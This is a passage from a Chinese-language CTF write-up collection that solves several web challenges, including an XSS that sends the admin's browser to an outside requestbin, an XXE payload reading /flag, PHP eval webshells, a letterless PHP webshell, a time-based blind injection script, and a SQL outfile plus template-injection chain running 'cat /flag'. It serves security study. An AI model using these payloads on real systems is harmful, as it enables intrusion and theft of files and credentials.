/admin.php?mod=moban\u0026amp;act=del\u0026amp;token=709991a77ab3f79e5dcad72d0453978e\u0026amp;tpl=phar:///var/www/html/data/attachment/brand/2.txt Referer: http://acdb618d-67d7-416b-a534-23a858dbe1e4.node4.buuoj.cn:81/admin.php?mod=moban 这里需要传入csrf的token（post上传处可以拿到），还需要设置一下Referer\nflag{9085d530-559f-49bd-9e0e-718780146bd3}\n*[Zer0pts2020]musicblog 注册账号并登入，可以创建post，勾选publish可以有admin访问，这肯定是个xss类的题目了\n整个站有比较完善的csp规则\n看下worker.js的工作逻辑\nconst fs = require(\u0026#39;fs\u0026#39;) const md5 = require(\u0026#39;md5\u0026#39;); const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const Redis = require(\u0026#39;ioredis\u0026#39;); const connection = new Redis(6379, \u0026#39;redis\u0026#39;); const admin_username = \u0026#34;admin\u0026#34;; const admin_password = \u0026#34;w28J0zjqpp6w9Ty8Sl58Z7iEf4h911zZ\u0026#34;; const flag = \u0026#39;zer0pts{M4sh1m4fr3sh!!}\u0026#39;; const browser_option = { executablePath: \u0026#39;google-chrome-unstable\u0026#39;, headless: true, args: [ \u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-background-networking\u0026#39;, \u0026#39;--disable-default-apps\u0026#39;, \u0026#39;--disable-extensions\u0026#39;, \u0026#39;--disable-gpu\u0026#39;, \u0026#39;--disable-sync\u0026#39;, \u0026#39;--disable-translate\u0026#39;, \u0026#39;--hide-scrollbars\u0026#39;, \u0026#39;--metrics-recording-only\u0026#39;, \u0026#39;--mute-audio\u0026#39;, \u0026#39;--no-first-run\u0026#39;, \u0026#39;--safebrowsing-disable-auto-update\u0026#39;, ], }; let browser = undefined; const crawl = async (url) =\u0026gt; { console.log(`[+] Query! (${url})`); const page = await browser.newPage(); try { await page.setUserAgent(flag); await page.goto(url, { waitUntil: \u0026#39;networkidle0\u0026#39;, timeout: 3 * 1000, }); page.click(\u0026#39;#like\u0026#39;); await page.waitForNavigation({timeout: 3000}); } catch (err){ console.log(err); } await page.close(); console.log(`[+] Done! (${url})`) }; const init = async () =\u0026gt; { const browser = await puppeteer.launch(browser_option); const page = await browser.newPage(); console.log(`[+] Setting up...`); try { await page.goto(`http://challenge/login.php`); await page.waitFor(\u0026#39;#username\u0026#39;); await page.type(\u0026#39;#username\u0026#39;, admin_username); await page.waitFor(\u0026#39;#password\u0026#39;); await page.type(\u0026#39;#password\u0026#39;, admin_password); await page.waitFor(\u0026#39;#login-submit\u0026#39;); await Promise.all([ page.$eval(\u0026#39;#login-submit\u0026#39;, elem =\u0026gt; elem.click()), page.waitForNavigation() ]); const body = await page.evaluate(() =\u0026gt; document.body.innerHTML); if (!body.includes(\u0026#39;href=\u0026#34;posts.php\u0026#34;\u0026#39;)){ throw Error(`Login failed at ${page.url()}.`); } console.log(`[+] Setup done!`); } catch (err) { console.log(`[-] Error while setting up :(`); console.log(err); const body = await page.evaluate(() =\u0026gt; document.body.innerHTML); console.log(`body: ${body}`); } try{ await page.close(); } catch (err) { console.log(err); } return browser; }; function handle(){ console.log(\u0026#34;[+] handle\u0026#34;); connection.blpop(\u0026#34;query\u0026#34;, 0, async function(err, message) { if (browser === undefined) browser = await init(); await crawl(\u0026#34;http://challenge/post.php?id=\u0026#34; + message[1]); setTimeout(handle, 10); // handle next }); } handle(); // first ignite 可以看到有flag，肯定是要xss拿到；admin会先登入admin账号，接着crawl()访问url\ntry { await page.setUserAgent(flag); await page.goto(url, { waitUntil: \u0026#39;networkidle0\u0026#39;, timeout: 3 * 1000, }); page.click(\u0026#39;#like\u0026#39;); await page.waitForNavigation({timeout: 3000}); } catch (err){ console.log(err); } 会点击页面的#like，也就是上面创建Post时勾选的框\n注意到它对标签的过滤，但是允许\u0026lt;audio\u0026gt;的存在\n查资料可知strip_tags有安全问题，它不会过滤\u0026lt;a/udio\u0026gt;标签，并且\u0026lt;a/udio\u0026gt;会作为超链接\u0026lt;a\u0026gt;被解析，同时超链接的跳转是不受csp的控制的，payload\n\u0026lt;a/udio id=like href=\u0026#34;http://http.requestbin.buuoj.cn/v4c4pyv4\u0026#34;\u0026gt;aa\u0026lt;/a/udio\u0026gt; buu改k8s之后内网的题多少有点问题，一直拿不到flag，寄\n[FireshellCTF2020]Cars 这咋就apk了……算了，摁看\n在Rest.kt中看到三个路由\n在domain目录下可以看到对应接收的参数格式，/comment可以传入name和message；在CommentActivity中有个send_comment调用了postComment\n这里使用了GsonConvertFactory，这是一个解析json的库，同时这里还引入了retrofit2，给我们xxe的可能\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;ISO-8859-1\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt; \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///flag\u0026#34; \u0026gt; ]\u0026gt; \u0026lt;Comment\u0026gt; \u0026lt;name\u0026gt;\u0026amp;xxe;\u0026lt;/name\u0026gt; \u0026lt;message\u0026gt;flag please!\u0026lt;/message\u0026gt; \u0026lt;/Comment\u0026gt; 记得修改Content-Type为application/xml\nflag{d96dc7a4-8be4-4e05-9bbf-64fcf8009182}\n[网鼎杯 2020 总决赛]Novel 只看给的附件，大概扫一下猜测是个反序列化的题；然后看下页面交互，好像跟猜的有一点不太一样，可以选择私藏，会post访问/back/backup，对应的是back.class.php 传入filename和path，选择上传文件会post访问/upload/profile，对应的是upload.class.php\nindex.php中关键处在这里\nback类中除backup外还有三个私有函数_write, _create, random_code\t，在调用backup时会先依次调用这几个函数进行处理\nbackup中，首先判断profile/下有没有同名文件，对内容进行htmlspecialchars处理后，先是用random_code生成随机密码，然后进行\n$this-\u0026gt;_write($dest, $this-\u0026gt;_create($password, $content)); _create会将密码和内容拼到一起\nprivate function _create($password, $content){ $_content=\u0026#39;\u0026lt;?php $_GET[\u0026#34;password\u0026#34;]===\u0026#34;\u0026#39;.$password.\u0026#39;\u0026#34;?print(\u0026#34;\u0026#39;.$content.\u0026#39;\u0026#34;):exit(); \u0026#39;; return $_content; } 随后进入_write\nprivate function _write($dest, $content){ $f1=$dest; $f2=\u0026#39;private/\u0026#39;.$this-\u0026gt;random_code(10).\u0026#34;.php\u0026#34;; $stream_f1 = fopen($f1, \u0026#39;w+\u0026#39;); fwrite($stream_f1, $content); rewind($stream_f1); $f1_read=fread($stream_f1, 3000); preg_match(\u0026#39;/^\u0026lt;\\?php \\$_GET\\[\\\u0026#34;password\\\u0026#34;\\]===\\\u0026#34;[a-zA-Z0-9]{8}\\\u0026#34;\\?print\\(\\\u0026#34;.*\\\u0026#34;\\):exit\\(\\); $/s\u0026#39;, $f1_read, $matches); if(!empty($matches[0])){ copy($f1,$f2); fclose($stream_f1); return $f2; }else{ fwrite($stream_f1, \u0026#39;\u0026lt;?php exit(); ?\u0026gt;\u0026#39;); fclose($stream_f1); return false; } } 先将$dest和上面_create生成的内容拼一起，然后对内容进行过滤处理，通过过滤的话将会在/private目录下存一份备份文件并返回完整路径，没通过过滤的话会在文件中写入死亡exit\n我们的攻击思路是上传一个txt，之后通过back生成后缀为php的备份文件，拿webshell；构造payload\namiz.txt\n{${eval($_GET[1])}} GET /private/mKrZmVugUo.php?password=4lsUOHWN\u0026amp;1=system(\u0026#39;cat /flag.txt\u0026#39;); flag{913c1949-edef-4459-8ffc-7970b9c93f14}\n注意这里页面上传的时候要双击submit才会弹出文件管理器\n[Windows]LFI2019 开幕雷击，直接就是phpinfo的背景，显示是一个windows系统，没有disable_functions也没有open_basedir\n有三个按钮，info提示flag在flag.php，upload可以上传文件，include可以包含；给了源码，还挺长的，二百多行\n大多是一些基础操作，防xss, ssrf, session，有几个类比较显眼，首先是Get，它是include时调用的类，会new一个实例然后调用其中的get\nclass Get { protected function nanahira(){ // senpai notice me // function exploit($data){ $exploit = new System(); } $_GET[\u0026#39;trigger\u0026#39;] \u0026amp;\u0026amp; !@@@@@@@@@@@@@exploit($$$$$$_GET[\u0026#39;leak\u0026#39;][\u0026#39;leak\u0026#39;]); } private $filename; function __construct($filename){ $this-\u0026gt;filename = path_sanitizer($filename); } function get(){ if($this-\u0026gt;filename === false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;blocked by path sanitizer\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // wtf???? // if(!@file_exists($this-\u0026gt;filename)){ // index files are *completely* disabled. // if(stripos($this-\u0026gt;filename, \u0026#34;index\u0026#34;) !== false){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;you cannot include index files!\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // hardened sanitizer spawned. thus we sense ambiguity // $read_file = \u0026#34;./files/\u0026#34; . $this-\u0026gt;filename; $read_file_with_hardened_filter = \u0026#34;./files/\u0026#34; . path_sanitizer($this-\u0026gt;filename, true); if($read_file === $read_file_with_hardened_filter || @file_get_contents($read_file) === @file_get_contents($read_file_with_hardened_filter)){ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;request blocked\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } // .. and finally, include *un*exploitable file is included. // @include(\u0026#34;./files/\u0026#34; . $this-\u0026gt;filename); return [\u0026#34;type\u0026#34; =\u0026gt; \u0026#34;success\u0026#34;]; }else{ return [\u0026#34;msg\u0026#34; =\u0026gt; \u0026#34;invalid filename (wtf)\u0026#34;, \u0026#34;type\u0026#34; =\u0026gt; \u0026#34;error\u0026#34;]; } } } 其中对文件名的waf是path_sanitizer，黑名单挺狠的\nfunction path_sanitizer($dir, $harden=false){ $dir = (string)$dir; $dir_len = strlen($dir); // Deny LFI/RFI/XSS // $filter = [\u0026#39;.\u0026#39;, \u0026#39;./\u0026#39;, \u0026#39;~\u0026#39;, \u0026#39;.\\\\\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;\u0026gt;\u0026#39;]; foreach($filter as $f){ if(stripos($dir, $f) !== false){ return false; } } // Deny SSRF and all possible weird bypasses // $stream = stream_get_wrappers(); $stream = array_merge($stream, stream_get_transports()); $stream = array_merge($stream, stream_get_filters()); foreach($stream as $f){ $f_len = strlen($f); if(substr($dir, 0, $f_len) === $f){ return false; } } // Deny length // if($dir_len \u0026gt;= 128){ return false; } // Easy level hardening // if($harden){ $harden_filter = [\u0026#34;/\u0026#34;, \u0026#34;\\\\\u0026#34;]; foreach($harden_filter as $f){ $dir = str_replace($f, \u0026#34;\u0026#34;, $dir); } } // Sanitize feature is available starting from the medium level // return $dir; } $filename单独经过waf之后得到的文件路径$read_file_with_hardened_filter必须和之前的$read_file不同，读到的文件内容也必须不同\npost的地方用的是Put类，大差不差，多了个对code的waf，code_sanitizer\nfunction code_sanitizer($code){ // Computer-chan, please don\u0026#39;t speak english. Speak something else! // $code = preg_replace(\u0026#34;/[^\u0026lt;\u0026gt;!@#$%\\^\u0026amp;*\\_?+\\.\\-\\\\\\\u0026#39;\\\u0026#34;\\=\\(\\)\\[\\]\\;]/u\u0026#34;, \u0026#34;*Nope*\u0026#34;, (string)$code); return $code; } 正常linux下写入test文件，包含test\\，经过waf之后得到./files/test，但是处理前的./files/test\\无法读取文件内容，失败\n这里用到的trick是windows下执行file_get_contents时会把\u0026quot;解释为.\nfile_get_contents(\u0026#39;test.php\u0026#39;) === file_get_contents(\u0026#39;test\u0026#34;php\u0026#39;) 利用这个trick，上传文件名为test，读取文件名为\u0026quot;/test，过waf后路径为./files/.test，处理前路径为./files/./test，可以正常读取文件内容\n关于shell，继续用p牛的这篇一些不包含数字和字母的webshell\n\u0026lt;?=$_=[];$_=\u0026#34;$_\u0026#34;;$_=$_[(\u0026#34;!\u0026#34;==\u0026#34;!\u0026#34;)+(\u0026#34;!\u0026#34;==\u0026#34;!\u0026#34;)+(\u0026#34;!\u0026#34;==\u0026#34;!\u0026#34;)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.\u0026#39;.\u0026#39;.$____.$_____.$____;$__($___);?\u0026gt; 注意对+进行url编码\nflag{f5bf0f29-bb51-4f28-b9ee-d9ef9b1e3915}\n————之后看更多师傅们的wp，发现由于是win的环境还可以有别的trick来利用\nwin下有磁盘流创建目录的方式\n当file_put_contents传入的文件名为amiz::$INDEX_ALLOCATION时 就会在当前文件夹下创建一个名为amiz的文件夹，内容为空\n我们先用put创建文件夹，再put向这个文件夹下写shell，最后包含这个文件夹下的shell就可以了\n参考：wp1 | wp2\n*[RCTF2019]calcalcalc | char-by-char-sqli 给了源码，离谱，有3个语言的后端，pho nodejs python\u0026hellip;\u0026hellip;..\n先看前端，frontend/views/index.hbs\n会post方式请求/calculate，但好像也算不了啥东西，返回201，然后是frontend/src/app.controller.ts\n有一说一ts我看起来好费劲……它还涉及到另外两个文件，calculate.model.ts\n其中用到的@ExpressionValidator，expresssion.validator.ts\n如果18行的isVip为false，就会判断长度，我们可以直接传入json，设它为true\n三个后端都会对我们请求的式子进行运算，但只有三个返回结果一致时才可以通过\nPython的后端有处理post请求的部分，backend-python/src/app.py\n会将请求的expression参数进行json处理后eval，那入手点就在这里了；但是13行的规则比较严苛，我们采用chr()的方式绕过\n但是由于它没有明确的回显，并且后端处于内网中不能外带数据，所以采用时间盲注的思想，配合二分的脚本拿flag\n*由于buuoj的内网环境问题，这里做不了，所以只写一下脚本，等啥时候修复了再回来做（脚本参考guoke师傅的，二分法\n核心的盲注payload是这个\n__import__(\u0026#39;time\u0026#39;).sleep(5) if (ord(open(\u0026#39;/flag\u0026#39;,\u0026#39;r\u0026#39;).read() [str(i)])\u0026gt;str(mid))else 1 要过waf，所以转为chr()的形式，外面包一层eval\nimport requests import time x=\u0026#39;\u0026#39; def getpayload(num,mid): payload=\u0026#34;__import__(\u0026#39;time\u0026#39;).sleep(5) if (ord(open(\u0026#39;/flag\u0026#39;,\u0026#39;r\u0026#39;).read()[\u0026#34;+str(num)+\u0026#34;])\u0026gt;\u0026#34;+str(mid)+\u0026#34;) else 1\u0026#34; data=\u0026#39;\u0026#39; for i in payload: data+=\u0026#39;chr(\u0026#39;+str(ord(i))+\u0026#39;)+\u0026#39; return(\u0026#39;eval(\u0026#39;+data[:-1]+\u0026#39;)\u0026#39;) url=\u0026#39;xxxx/calculate\u0026#39; for a in range(0,60): max = 130 min = 30 while max \u0026gt;=min: mid=(max+min)//2 payload=getpayload(a,mid) time1=time.time() r = requests.post(url, json={\u0026#39;isVip\u0026#39;: True, \u0026#39;expression\u0026#39;: payload}) time2=time.time() if (time2-time1\u0026gt;5): min=mid+1 else: max=mid if max==mid==min: x+=chr(mid) print(str(a)+\u0026#39;:\u0026#39;+x) break 参考：wp | wp2\n[QWB2021 Quals]托纳多 | sqli processlist表 ssti 注册账号登入，但是只有admin才有flag，那肯定得要sqli了，在登录的地方注了半天，结果发现注入点在注册的页面（尴尬），直接单引号就可以闭合\nadmin\u0026#39;or \u0026#39;1\t# 回显this username had been used 参考官方wp，这里用的是processlist表，这个表很特别\n它读取正在执行的sql语句，我们可以通过info列来获得当前的表名列名，还是用祖传的二分法来爆admin的密码\n（尴尬的是爆一会儿就寄了，害，寄寄寄\n按照预期解，登入后可以任意文件读取，读/proc/self/cmdline可以看到python3 /qwb/app/app.py，无法直接读app.py，但是可以读pyc\nhttp的响应头中有tornado的版本号6.0.3，对应的python\u0026gt;=3.5，爆破一下pyc的名称，得到pyc\n/qwbimage.php?qwb_image_name=/qwb/app/__pycache__/app.cpython-35.pyc uncompyle6反编译得到源码\nimport tornado.ioloop, tornado.web, tornado.options, pymysql, os, re settings = {\u0026#39;static_path\u0026#39;: os.path.join(os.getcwd(), \u0026#39;static\u0026#39;), \u0026#39;cookie_secret\u0026#39;: \u0026#39;b93a9960-bfc0-11eb-b600-002b677144e0\u0026#39;} db_username = \u0026#39;root\u0026#39; db_password = \u0026#39;xxxx\u0026#39; class MainHandler(tornado.web.RequestHandler): def get(self): user = self.get_secure_cookie(\u0026#39;user\u0026#39;) if user and user == b\u0026#39;admin\u0026#39;: self.redirect(\u0026#39;/admin.php\u0026#39;, permanent=True) return self.render(\u0026#39;index.html\u0026#39;) class LoginHandler(tornado.web.RequestHandler): def get(self): username = self.get_argument(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) password = self.get_argument(\u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) if not username or not password: if not self.get_secure_cookie(\u0026#39;user\u0026#39;): self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`please input your password and username`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return if self.get_secure_cookie(\u0026#39;user\u0026#39;) == b\u0026#39;admin\u0026#39;: self.redirect(\u0026#39;/admin.php\u0026#39;, permanent=True) else: self.redirect(\u0026#39;/\u0026#39;, permanent=True) else: conn = pymysql.connect(\u0026#39;localhost\u0026#39;, db_username, db_password, \u0026#39;qwb\u0026#39;) cursor = conn.cursor() cursor.execute(\u0026#39;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s\u0026#39;, [username, password]) results = cursor.fetchall() if len(results) != 0: if results[0][1] == \u0026#39;admin\u0026#39;: self.set_secure_cookie(\u0026#39;user\u0026#39;, \u0026#39;admin\u0026#39;) cursor.close() conn.commit() conn.close() self.redirect(\u0026#39;/admin.php\u0026#39;, permanent=True) return else: cursor.close() conn.commit() conn.close() self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`login success, but only admin can get flag`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return else: cursor.close() conn.commit() conn.close() self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`your username or password is error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return class RegisterHandler(tornado.web.RequestHandler): def get(self): username = self.get_argument(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) password = self.get_argument(\u0026#39;password\u0026#39;, \u0026#39;\u0026#39;) word_bans = [\u0026#39;table\u0026#39;, \u0026#39;col\u0026#39;, \u0026#39;sys\u0026#39;, \u0026#39;union\u0026#39;, \u0026#39;inno\u0026#39;, \u0026#39;like\u0026#39;, \u0026#39;regexp\u0026#39;] bans = [\u0026#39;\u0026#34;\u0026#39;, \u0026#39;#\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;\u0026lt;\u0026#39;, \u0026#39;=\u0026#39;, \u0026#39;\u0026gt;\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;^\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;*\u0026#39;, \u0026#39;--\u0026#39;, \u0026#39;+\u0026#39;] for ban in word_bans: if re.search(ban, username, re.IGNORECASE): self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return for ban in bans: if ban in username: self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return if not username or not password: self.render(\u0026#39;register.html\u0026#39;) return if username == \u0026#39;admin\u0026#39;: self.render(\u0026#39;register.html\u0026#39;) return conn = pymysql.connect(\u0026#39;localhost\u0026#39;, db_username, db_password, \u0026#39;qwb\u0026#39;) cursor = conn.cursor() try: cursor.execute(\u0026#34;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=\u0026#39;%s\u0026#39;\u0026#34; % username) results = cursor.fetchall() if len(results) != 0: self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`this username had been used`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) conn.commit() conn.close() return except: conn.commit() conn.close() self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return try: cursor.execute(\u0026#39;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)\u0026#39;, [username, password]) conn.commit() conn.close() self.finish(\u0026#34;\u0026lt;script\u0026gt;alert(`success`);location.href=\u0026#39;/index.php\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34;) return except: conn.rollback() conn.close() self.finish(\u0026#39;\u0026lt;script\u0026gt;alert(`error`);history.go(-1);\u0026lt;/script\u0026gt;\u0026#39;) return class LogoutHandler(tornado.web.RequestHandler): def get(self): self.clear_all_cookies() self.redirect(\u0026#39;/\u0026#39;, permanent=True) class AdminHandler(tornado.web.RequestHandler): def get(self): user = self.get_secure_cookie(\u0026#39;user\u0026#39;) if not user or user != b\u0026#39;admin\u0026#39;: self.redirect(\u0026#39;/index.php\u0026#39;, permanent=True) return self.render(\u0026#39;admin.html\u0026#39;) class ImageHandler(tornado.web.RequestHandler): def get(self): user = self.get_secure_cookie(\u0026#39;user\u0026#39;) image_name = self.get_argument(\u0026#39;qwb_image_name\u0026#39;, \u0026#39;header.jpeg\u0026#39;) if not image_name: self.redirect(\u0026#39;/\u0026#39;, permanent=True) return else: if not user or user != b\u0026#39;admin\u0026#39;: self.redirect(\u0026#39;/\u0026#39;, permanent=True) return if image_name.endswith(\u0026#39;.py\u0026#39;) or \u0026#39;flag\u0026#39; in image_name or \u0026#39;..\u0026#39; in image_name: self.finish(\u0026#34;nonono, you can\u0026#39;t read it.\u0026#34;) return image_name = os.path.join(os.getcwd() + \u0026#39;/image\u0026#39;, image_name) with open(image_name, \u0026#39;rb\u0026#39;) as (f): img = f.read() self.set_header(\u0026#39;Content-Type\u0026#39;, \u0026#39;image/jpeg\u0026#39;) self.finish(img) return class SecretHandler(tornado.web.RequestHandler): def get(self): if len(tornado.web.RequestHandler._template_loaders): for i in tornado.web.RequestHandler._template_loaders: tornado.web.RequestHandler._template_loaders[i].reset() msg = self.get_argument(\u0026#39;congratulations\u0026#39;, \u0026#39;oh! you find it\u0026#39;) bans = [] for ban in bans: if ban in msg: self.finish(\u0026#39;bad hack,go out!\u0026#39;) return with open(\u0026#39;congratulations.html\u0026#39;, \u0026#39;w\u0026#39;) as (f): f.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;congratulations\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt;alert(\u0026#34;%s\u0026#34;);location.href=\\\u0026#39;/admin.php\\\u0026#39;;\u0026lt;/script\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\\n\u0026#39; % msg) f.flush() self.render(\u0026#39;congratulations.html\u0026#39;) if tornado.web.RequestHandler._template_loaders: for i in tornado.web.RequestHandler._template_loaders: tornado.web.RequestHandler._template_loaders[i].reset() def make_app(): return tornado.web.Application([ ( \u0026#39;/index.php\u0026#39;, MainHandler), ( \u0026#39;/login.php\u0026#39;, LoginHandler), ( \u0026#39;/logout.php\u0026#39;, LogoutHandler), ( \u0026#39;/register.php\u0026#39;, RegisterHandler), ( \u0026#39;/admin.php\u0026#39;, AdminHandler), ( \u0026#39;/qwbimage.php\u0026#39;, ImageHandler), ( \u0026#39;/good_job_my_ctfer.php\u0026#39;, SecretHandler), ( \u0026#39;/\u0026#39;, MainHandler)], **settings) if __name__ == \u0026#39;__main__\u0026#39;: app = make_app() app.listen(8000) tornado.ioloop.IOLoop.current().start() print(\u0026#39;start\u0026#39;) 可以看到/good_job_my_ctfer.php有ssti，但是{{}}被过滤，只能用{%%}，这里用到的是{%extends %}，它可以传递一个文件路径作为参数，将其包含并渲染\n所以我们可以先通过sqli的outfile写文件，然后通过ssti包含 来执行读flag的命令\n/register.php?username=amiz\u0026amp;password={%set return __import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat /flag\u0026#34;).read()%} /register.php?username=amiz\u0026#39; into outfile \u0026#39;/var/lib/mysql-files/amiz\u0026amp;password=amiz /good_job_my_ctfer.php?congratulations={%extends /var/lib/mysql-files/amiz%} 先通过注册把payload写到密码部分，然后outfile到mysql的默认导出目录/var/lib/mysql-files/，最后包含\nflag{79d863ac-1fc6-42f6-951a-d3b6f0468b7f}\n[PWNHUB 公开赛 2018]傻 fufu 的工作日 | upload /UploadFile.class.php.bak, /index.php.bak 有备份文件泄露，使用phpjiami进行加密，我们用脚本进行解密\n\u0026lt;?php if($_FILES) { include \u0026#39;UploadFile.class.php\u0026#39;; $dist = \u0026#39;upload\u0026#39;; $upload = new UploadFile($dist, \u0026#39;upfile\u0026#39;); $data = $upload-\u0026gt;upload(); } \u0026lt;?php class UploadFile { public $error = \u0026#39;\u0026#39;; protected $field; protected $allow_ext; protected $allow_size; protected $dist_path; protected $new_path; function __construct($dist_path, $field=\u0026#39;upfile\u0026#39;, $new_name=\u0026#39;random\u0026#39;, $allow_ext=[\u0026#39;gif\u0026#39;, \u0026#39;jpg\u0026#39;, \u0026#39;jpeg\u0026#39;, \u0026#39;png\u0026#39;], $allow_size=102400) { $this-\u0026gt;field = $field; $this-\u0026gt;allow_ext = $allow_ext; $this-\u0026gt;allow_size = $allow_size; $this-\u0026gt;dist_path = realpath($dist_path); if ($new_name === \u0026#39;random\u0026#39;) { $this-\u0026gt;new_name = uniqid(); } elseif (is_string($new_name)) { $this-\u0026gt;new_name = $new_name; } else { $this-\u0026gt;new_name = null; } } protected function codeToMessage($code) { switch ($code) { case UPLOAD_ERR_INI_SIZE: $message = \u0026#34;The uploaded file exceeds the upload_max_filesize directive in php.ini\u0026#34;; break; case UPLOAD_ERR_FORM_SIZE: $message = \u0026#34;The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form\u0026#34;; break; case UPLOAD_ERR_PARTIAL: $message = \u0026#34;The uploaded file was only partially uploaded\u0026#34;; break; case UPLOAD_ERR_NO_FILE: $message = \u0026#34;No file was uploaded\u0026#34;; break; case UPLOAD_ERR_NO_TMP_DIR: $message = \u0026#34;Missing a temporary folder\u0026#34;; break; case UPLOAD_ERR_CANT_WRITE: $message = \u0026#34;Failed to write file to disk\u0026#34;; break; case UPLOAD_ERR_EXTENSION: $message = \u0026#34;File upload stopped by extension\u0026#34;; break; default: $message = \u0026#34;Unknown upload error\u0026#34;; break; } return $message; } protected function error($info) { $this-\u0026gt;error = $info; return false; } public function upload() { if(empty($_FILES[$this-\u0026gt;field])) { return $this-\u0026gt;error(\u0026#39;上传文件为空\u0026#39;); } if(is_array($_FILES[$this-\u0026gt;field][\u0026#39;error\u0026#39;])) { return $this-\u0026gt;error(\u0026#39;一次只能上传一个文件\u0026#39;); } if($_FILES[$this-\u0026gt;field][\u0026#39;error\u0026#39;] != UPLOAD_ERR_OK) { return $this-\u0026gt;error($this-\u0026gt;codeToMessage($_FILES[$this-\u0026gt;field][\u0026#39;error\u0026#39;])); } $filename = !empty($_POST[$this-\u0026gt;field]) ? $_POST[$this-\u0026gt;field] : $_FILES[$this-\u0026gt;field][\u0026#39;name\u0026#39;]; if(!is_array($filename)) { $filename = explode(\u0026#39;.\u0026#39;, $filename); } foreach ($filename as $name) { if(preg_match(\u0026#39;#[\u0026lt;\u0026gt;:\u0026#34;/\\\\|?*.]#is\u0026#39;, $name)) { return $this-\u0026gt;error(\u0026#39;文件名中包含非法字符\u0026#39;); } } if($_FILES[$this-\u0026gt;field][\u0026#39;size\u0026#39;] \u0026gt; $this-\u0026gt;allow_size) { return $this-\u0026gt;error(\u0026#39;你上传的文件太大\u0026#39;); } if(!in_array($filename[count($filename)-1], $this-\u0026gt;allow_ext)) { return $this-\u0026gt;error(\u0026#39;只允许上传图片文件\u0026#39;); } // 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞 $origin_name = current($filename); $ext = end($filename); $new_name = ($this-\u0026gt;new_name ? $this-\u0026gt;new_name : $origin_name) . \u0026#39;.\u0026#39; . $ext; $target_fullpath = $this-\u0026gt;dist_path . DIRECTORY_SEPARATOR . $new_name; // 创建目录 if(!is_dir($this-\u0026gt;dist_path)) { mkdir($this-\u0026gt;dist_path); } if(is_uploaded_file($_FILES[$this-\u0026gt;field][\u0026#39;tmp_name\u0026#39;]) \u0026amp;\u0026amp; move_uploaded_file($_FILES[$this-\u0026gt;field][\u0026#39;tmp_name\u0026#39;], $target_fullpath)) { // Success upload } elseif (rename($_FILES[$this-\u0026gt;field][\u0026#39;tmp_name\u0026#39;], $target_fullpath)) { // Success upload } else { return $this-\u0026gt;error(\u0026#39;写入文件失败，可能是目标目录不可写\u0026#39;); } return [ \u0026#39;name\u0026#39; =\u0026gt; $origin_name, \u0026#39;filename\u0026#39; =\u0026gt; $new_name, \u0026#39;type\u0026#39; 